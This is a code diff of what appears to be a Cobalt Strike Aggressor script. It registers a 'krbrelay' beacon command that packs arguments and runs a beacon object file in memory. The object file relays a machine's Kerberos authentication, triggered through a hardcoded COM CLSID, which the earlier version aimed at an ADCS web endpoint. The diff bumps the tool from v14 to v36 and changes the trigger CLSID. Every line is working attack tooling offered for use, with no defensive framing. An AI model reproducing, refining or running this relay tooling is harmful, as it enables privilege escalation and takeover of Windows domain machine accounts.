@@ -1,9 +1,9 @@
-println("[+] Loaded KrbRelay direct in-process BOF v14");
+println("[+] Loaded KrbRelay reusable single-activation BOF v36");
 
-# The two loopback addresses and validated trigger CLSID remain internal.
+# The two loopback addresses and validated first-use trigger remain internal.
 beacon_command_register(
     "krbrelay",
-    "Relay machine Kerberos authentication to an ADCS web endpoint",
+    "Run one fresh COM activation and relay its machine Kerberos exchange",
     "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint>"
 );
 
@@ -25,7 +25,7 @@ alias krbrelay {
     $object = readb($handle, -1);
     closef($handle);
     # int() prevents a numeric port becoming a Machine field.
-    $packed = bof_pack($1, "zizzzz", "127.0.0.1", int($2), $3, "127.0.0.1", $4, "{90f18417-f0f1-484e-9d3c-59dceee5dbd8}");
-    btask($1, "Running direct in-process Kerberos relay BOF v14");
+    $packed = bof_pack($1, "zizzzz", "127.0.0.1", int($2), $3, "127.0.0.1", $4, "{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}");
+    btask($1, "Running reusable single-activation Kerberos relay BOF v36");
     beacon_inline_execute($1, $object, "go", $packed);
 }
